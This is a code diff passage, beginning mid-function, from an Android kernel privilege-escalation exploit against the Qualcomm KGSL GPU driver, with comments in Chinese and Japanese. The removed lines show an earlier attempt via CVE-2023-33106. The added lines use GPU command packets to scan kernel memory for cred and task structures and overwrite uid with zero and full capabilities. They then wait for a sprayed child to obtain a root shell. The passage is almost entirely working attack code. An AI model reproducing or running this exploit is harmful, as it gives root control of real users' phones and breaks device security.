+        memset(dst_m, 0, 0x1000);
+        int dw = 0;
+        cmd[dw++] = cp_type7(CP_NOP, 0);
+        for (int i = 0; i < SCAN_DWORDS; i++) {
+            uint32_t dl, dh, sl, sh;
+            split64(dst_ga + i * 4, &dl, &dh);
+            split64(va + i * 4, &sl, &sh);
+            cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
+            cmd[dw++] = 0;
+            cmd[dw++] = dl; cmd[dw++] = dh;
+            cmd[dw++] = sl; cmd[dw++] = sh;
+        }
+        cmd[dw++] = cp_type7(CP_NOP, 0);
+        __sync_synchronize();
+        unsigned int ts;
+        if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) < 0) break;
+        if (wait_timestamp(kgsl_fd, ctx_id, ts) < 0) break;
+        __sync_synchronize();
+
+        uint32_t *data = (uint32_t *)dst_m;
+        int nz = 0, n_comm = 0, comm_off = -1;
+        for (int i = 0; i < SCAN_DWORDS - 1; i++) {
+            if (data[i] != 0) nz++;
+            if (data[i] == 0x4B534154 && data[i+1] == 0x21464155) {
+                if (comm_off < 0) comm_off = i * 4;
+                n_comm++;
+            }
+        }
+        int cred_off_found = -1;
+        for (int i = 0; i < SCAN_DWORDS - 8; i++) {
+            int cnt = 0;
+            for (int j = 0; j < 8; j++)
+                if (data[i + j] == 0x000007D0) cnt++;
+            if (cnt >= 4) { cred_off_found = i * 4; break; }
+        }
+        if (n_comm > 0) {
+            printf("  [TASK_COMM] va=0x%lx nz=%d comm_off=0x%x\n",
+                (unsigned long)va, nz, comm_off);
+            task_comm_offs[n_task] = comm_off;
+            task_pages[n_task++] = va;
+            if (n_task == 1) memcpy(task_page_data, data, SCAN_DWORDS * 4);
+        }
+        if (cred_off_found >= 0 && n_cred < 32) {
+            printf("  [CRED] va=0x%lx nz=%d off=0x%x\n",
+                (unsigned long)va, nz, cred_off_found);
+            cred_pages[n_cred] = va;
+            cred_offs[n_cred] = cred_off_found;
+            n_cred++;
+        }
+        // 扫描 task_security_struct 特征（6个相同dword）
+        int sec_hits[64]; int n_sec = 0;
+        for (int i = 0; i < SCAN_DWORDS - 6 && n_sec < 64; i++) {
+            if (data[i] == data[i+1] && data[i] == data[i+2] &&
+                data[i] == data[i+3] && data[i] == data[i+4] &&
+                data[i] == data[i+5] && data[i] != 0) {
+                int dup = 0;
+                for (int s = 0; s < n_sec; s++)
+                    if (sec_hits[s] == (int)data[i]) { dup = 1; break; }
+                if (!dup) {
+                    sec_hits[n_sec++] = data[i];
+                    if (data[i] < 10000)
+                        printf("  [SEC_CRED] va=0x%lx sid=%u off=0x%x\n",
+                            (unsigned long)va, data[i], i*4);
+                }
+                i += 6;
+            }
+        }
     }
-    g_init_cred_addr = VMLINUX_INIT_CRED + g_kaslr_offset;
-    printf("[+] init_cred = 0x%lx\n", (unsigned long)g_init_cred_addr);
+    printf("[*] Scan complete: found %d task_struct pages, %d cred pages\n", n_task, n_cred);
 
-    /* ==========================================================
-     * フェーズ4: CVE-2023-33106 でOOB Writeをトリガー
-     * ========================================================== */
-    printf("\n[=== Phase 4: OOB Write (CVE-2023-33106) ===]\n");
-    
-    /* ターゲットアドレス: init_cred + offset (cred構造体のuidフィールド) */
-    /* cred構造体のuidは +0x04 オフセットにある (カーネル4.1.x) */
-    uint64_t target_cred_addr = g_init_cred_addr + 0x04;
-    uint64_t write_value = 0;  /* uid=0 */
-    
-    printf("[*] Target cred address: 0x%lx\n", (unsigned long)target_cred_addr);
-    printf("[*] Writing uid=0 to cred structure\n");
-    
-    /* OOB Writeをトリガー */
-    /* 注意: 完全なエクスプロイトでは、ヒープスプレーでcred構造体を
-     * OOB Writeのターゲットになる位置に配置する必要がある [reference:6] */
-    if (trigger_oob_write(ctx_id, target_cred_addr, write_value) < 0) {
-        printf("[!] OOB write trigger failed, but continuing...\n");
+    // 保存 cred 部分字段（用于修复）
+    uint32_t saved_user_lo = 0, saved_user_hi = 0;
+    uint32_t saved_user_ns_lo = 0, saved_user_ns_hi = 0;
+    uint32_t saved_grp_lo = 0, saved_grp_hi = 0;
+
+    // Dump 第一个 cred 页布局
+    if (n_cred > 0) {
+        printf("[*] Phase 7c: Dumping first cred page for layout verification\n");
+        memset(ib_m, 0, 0x10000);
+        memset(dst_m, 0, 0x1000);
+        uint32_t *ccmd = (uint32_t *)ib_m;
+        int cdw = 0;
+        ccmd[cdw++] = cp_type7(CP_NOP, 0);
+        for (int ci = 0; ci < 48; ci++) {
+            uint32_t cdl, cdh, csl, csh;
+            split64(dst_ga + ci * 4, &cdl, &cdh);
+            split64(cred_pages[0] + cred_offs[0] + ci * 4, &csl, &csh);
+            ccmd[cdw++] = cp_type7(CP_MEM_TO_MEM, 5);
+            ccmd[cdw++] = 0; ccmd[cdw++] = cdl; ccmd[cdw++] = cdh;
+            ccmd[cdw++] = csl; ccmd[cdw++] = csh;
+        }
+        ccmd[cdw++] = cp_type7(CP_NOP, 0);
+        __sync_synchronize();
+        unsigned int cts;
+        if (submit_ib(kgsl_fd, ctx_id, ib_ga, cdw*4, ib_id, &cts) == 0) {
+            wait_timestamp(kgsl_fd, ctx_id, cts);
+            __sync_synchronize();
+            uint32_t *cd = (uint32_t *)dst_m;
+            printf("  cred+0x00:");
+            for (int ci = 0; ci < 48; ci++) {
+                if (ci > 0 && (ci % 8) == 0) printf("\n  cred+0x%02X:", ci*4);
+                printf(" %08X", cd[ci]);
+            }
+            printf("\n");
+            saved_user_lo = cd[32]; saved_user_hi = cd[33];
+            saved_user_ns_lo = cd[34]; saved_user_ns_hi = cd[35];
+            saved_grp_lo = cd[36]; saved_grp_hi = cd[37];
+        }
     }
 
-    /* ==========================================================
-     * フェーズ5: root権限確認
-     * ========================================================== */
-    printf("\n[=== Phase 5: Root Check ===]\n");
-    printf("  uid=%d euid=%d\n", getuid(), geteuid());
-    
-    if (getuid() == 0) {
-        printf("[+] ROOT! Spawning shell...\n");
-        execl("/system/bin/sh", "sh", NULL);
-        execl("/bin/sh", "sh", NULL);
-        printf("[-] Shell exec failed\n");
+    // ===== Phase 7e: Test GPU read from kernel VA (init_cred) =====
+    uint64_t inc_sec = 0;
+    {
+        printf("[*] Phase 7e: Testing GPU read from kernel VA (init_cred)\n");
+        memset(ib_m, 0, 0x10000); memset(dst_m, 0, 0x1000);
+        uint64_t test_vas[] = {
+            init_cred_addr,            // init_cred
+            init_cred_addr + 0x78,     // init_cred->security
+            0xFFFFFFC000000000ULL,     // PAGE_OFFSET
+            0xFFFFFF8000000000ULL,     // vmalloc base
+        };
+        uint32_t *tcmd = (uint32_t *)ib_m; int tdw = 0;
+        tcmd[tdw++] = cp_type7(CP_NOP, 0);
+        for (int i = 0; i < 4; i++) {
+            uint32_t dl, dh, sl, sh;
+            split64(dst_ga + i * 8, &dl, &dh);
+            split64(test_vas[i], &sl, &sh);
+            tcmd[tdw++] = cp_type7(CP_MEM_TO_MEM, 5);
+            tcmd[tdw++] = 0; tcmd[tdw++] = dl; tcmd[tdw++] = dh;
+            tcmd[tdw++] = sl; tcmd[tdw++] = sh;
+        }
+        tcmd[tdw++] = cp_type7(CP_NOP, 0);
+        __sync_synchronize();
+        unsigned int tts;
+        if (submit_ib(kgsl_fd, ctx_id, ib_ga, tdw*4, ib_id, &tts) == 0) {
+            wait_timestamp(kgsl_fd, ctx_id, tts);
+            __sync_synchronize();
+            uint32_t *td = (uint32_t *)dst_m;
+            for (int i = 0; i < 4; i++) {
+                uint64_t val = (uint64_t)td[i*2] | ((uint64_t)td[i*2+1] << 32);
+                printf("  KVA[%d]=0x%lX => 0x%016lX\n",
+                    i, (unsigned long)test_vas[i], (unsigned long)val);
+                if (i == 1) inc_sec = val;
+            }
+        }
+    }
+
+    // ===== Phase 7b: GPU→CPU coherency verification =====
+    printf("[*] Phase 7b: GPU→CPU coherency via DST buffer\n");
+    {
+        uint32_t *cmd = (uint32_t*)ib_m;
+        uint32_t sl, sh;
+        int dw = 0;
+        memset(ib_m, 0, 0x10000);
+        memset(dst_m, 0, 0x1000);
+        cmd[dw++] = cp_type7(CP_NOP, 0);
+        split64(dst_ga, &sl, &sh);
+        cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
+        cmd[dw++] = sl; cmd[dw++] = sh;
+        cmd[dw++] = 0xDEADBEEF; cmd[dw++] = 0xCAFEBABE;
+        split64(dst_ga + 8, &sl, &sh);
+        cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
+        cmd[dw++] = sl; cmd[dw++] = sh;
+        cmd[dw++] = 0x12345678; cmd[dw++] = 0x9ABCDEF0;
+        cmd[dw++] = cp_type7(CP_NOP, 0);
+        __sync_synchronize();
+        unsigned int ts;
+        if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0) {
+            wait_timestamp(kgsl_fd, ctx_id, ts);
+            __sync_synchronize();
+            uint64_t v0 = *(volatile uint64_t*)dst_m;
+            uint64_t v1 = *(volatile uint64_t*)(dst_m + 8);
+            printf("  DST[0]=0x%016llX DST[1]=0x%016llX coherency=%s\n",
+                (unsigned long long)v0, (unsigned long long)v1,
+                (v0 == 0xCAFEBABEDEADBEEFULL &&
+                 v1 == 0x9ABCDEF012345678ULL) ? "OK **UAF cred write should work**" : 
+                 (v0 == 0 ? "FAIL (DST not written)" : "FAIL (wrong value)"));
+        }
+    }
+
+    // ===== Phase 8b: Direct cred overwrite =====
+    if (n_cred > 0) {
+        printf("[*] Phase 8b: Writing uid=0 + full caps to %d cred pages\n", n_cred);
+        int n_ok = 0;
+        for (int p = 0; p < n_cred && p < 32; p++) {
+            uint64_t cbase = cred_pages[p] + cred_offs[p];
+            uint32_t *cmd = (uint32_t *)ib_m;
+            uint32_t zl, zh, dl, dh, sl, sh;
+            int dw;
+
+            // 读 before
+            memset(ib_m, 0, 0x10000); memset(dst_m, 0, 0x1000);
+            dw = 0;
+            cmd[dw++] = cp_type7(CP_NOP, 0);
+            for (int ci = 0; ci < 48; ci++) {
+                split64(dst_ga + ci * 4, &dl, &dh);
+                split64(cbase + ci * 4, &sl, &sh);
+                cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
+                cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
+                cmd[dw++] = sl; cmd[dw++] = sh;
+            }
+            cmd[dw++] = cp_type7(CP_NOP, 0);
+            __sync_synchronize();
+            unsigned int ts;
+            if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
+                wait_timestamp(kgsl_fd, ctx_id, ts);
+            __sync_synchronize();
+            uint32_t *bd = (uint32_t *)dst_m;
+            printf("  cred[%d] BEFORE: security=0x%08X%08X uid=0x%08X\n",
+                p, bd[31], bd[30], bd[1]);
+
+            n_ok++;
+
+            // 设置 security 指针（若可读）
+            if (inc_sec != 0) {
+                printf("  Using init_cred->security = 0x%lX for cred[%d]\n",
+                    (unsigned long)inc_sec, p);
+                split64(cbase + 0x78, &zl, &zh);
+                cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
+                cmd[dw++] = zl; cmd[dw++] = zh;
+                split64(inc_sec, &zl, &zh);
+                cmd[dw++] = zl; cmd[dw++] = zh;
+            }
+
+            // 写 uid=0 + caps
+            memset(ib_m, 0, 0x10000);
+            dw = 0;
+            split64(cbase + 0x04, &zl, &zh);
+            cmd[dw++] = cp_type7(CP_MEM_WRITE, 21);
+            cmd[dw++] = zl; cmd[dw++] = zh;
+            for (int i = 0; i < 8; i++) cmd[dw++] = 0;
+            cmd[dw++] = 0x00000004;
+            cmd[dw++] = 0; cmd[dw++] = 0;
+            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x0000003F;
+            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x0000003F;
+            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x0000003F;
+            cmd[dw++] = 0; cmd[dw++] = 0;
+            // 读回 uid
+            memset(dst_m, 0, 0x1000);
+            split64(dst_ga, &dl, &dh);
+            split64(cbase + 0x04, &sl, &sh);
+            cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
+            cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
+            cmd[dw++] = sl; cmd[dw++] = sh;
+            cmd[dw++] = cp_type7(CP_NOP, 0);
+            __sync_synchronize();
+            if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
+                wait_timestamp(kgsl_fd, ctx_id, ts);
+            __sync_synchronize();
+            uint32_t uid = *(volatile uint32_t*)dst_m;
+            printf("  CRED[%d]: uid=0x%08X %s\n", p, uid,
+                uid == 0 ? "OK" : "FAIL");
+        }
+        printf("  Phase 8b: %d creds updated\n", n_ok);
+
+        // 读 after
+        if (n_cred > 0) {
+            printf("[*] Phase 8c: Dumping cred page AFTER write\n");
+            memset(ib_m, 0, 0x10000); memset(dst_m, 0, 0x1000);
+            uint32_t *ccmd = (uint32_t *)ib_m;
+            int cdw = 0;
+            ccmd[cdw++] = cp_type7(CP_NOP, 0);
+            for (int ci = 0; ci < 48; ci++) {
+                uint32_t dl, dh, sl, sh;
+                split64(dst_ga + ci * 4, &dl, &dh);
+                split64(cred_pages[0] + cred_offs[0] + ci * 4, &sl, &sh);
+                ccmd[cdw++] = cp_type7(CP_MEM_TO_MEM, 5);
+                ccmd[cdw++] = 0; ccmd[cdw++] = dl; ccmd[cdw++] = dh;
+                ccmd[cdw++] = sl; ccmd[cdw++] = sh;
+            }
+            ccmd[cdw++] = cp_type7(CP_NOP, 0);
+            __sync_synchronize();
+            unsigned int cts;
+            if (submit_ib(kgsl_fd, ctx_id, ib_ga, cdw*4, ib_id, &cts) == 0) {
+                wait_timestamp(kgsl_fd, ctx_id, cts);
+                __sync_synchronize();
+                uint32_t *cd = (uint32_t *)dst_m;
+                for (int ci = 0; ci < 48; ci++) {
+                    if (ci > 0 && (ci % 8) == 0) printf("\n  cred+0x%02X:", ci*4);
+                    printf(" %08X", cd[ci]);
+                }
+                printf("\n");
+                printf("  AFTER security=0x%08X%08X uid=0x%08X\n",
+                    cd[31], cd[30], cd[1]);
+            }
+        }
+    }
+
+    // ===== Phase 8d: Cache eviction =====
+    printf("[*] Phase 8d: Cache eviction\n"); fflush(stdout);
+    void *ev = mmap(0, 0x2000000, PROT_READ|PROT_WRITE,
+        MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+    if (ev != MAP_FAILED) {
+        volatile char *p = (volatile char *)ev;
+        for (uint64_t o = 0; o < 0x2000000; o += 64) p[o] = 0;
+        munmap(ev, 0x2000000);
+    }
+    sleep(1);
+
+    // ===== Phase 9: Wait for root shell =====
+    printf("[*] Phase 9: Waiting for root shell...\n");
+    printf("  parent uid=%u euid=%u\n", getuid(), geteuid());
+    fflush(stdout);
+
+    close(notify_pipe[1]);
+
+    struct pollfd pfd = { .fd = notify_pipe[0], .events = POLLIN };
+    pid_t winner = 0;
+    if (poll(&pfd, 1, 10000) > 0 &&
+        read(notify_pipe[0], &winner, sizeof(winner)) == sizeof(winner)) {
+        printf("[+] ROOT! uid=0 at PID %d\n", winner);
+        for (int i = 0; i < n_spray; i++)
+            if (spray_pids[i] != winner) kill(spray_pids[i], SIGKILL);
+        while (waitpid(-1, NULL, WNOHANG) > 0);
+        printf("\n  # ROOT SHELL (uid=0) - type exit to quit\n  # ");
+        fflush(stdout);
+        waitpid(winner, NULL, 0);
+        printf("[-] Root shell exited\n");
     } else {
-        printf("[-] Not root. OOB write may need heap spraying.\n");
-        printf("[*] Try adjusting numsyncs and heap layout.\n");
+        printf("[-] No child got uid=0\n");
     }
+    close(notify_pipe[0]);
 
-    /* クリーンアップ */
-    close(kgsl_fd);
-    printf("[*] Done.\n");
+    for (int i = 0; i < n_spray; i++) kill(spray_pids[i], SIGKILL);
+    while (wait(NULL) > 0);
+    printf("[*] Done. Goodbye.\n");
     return 0;
 }
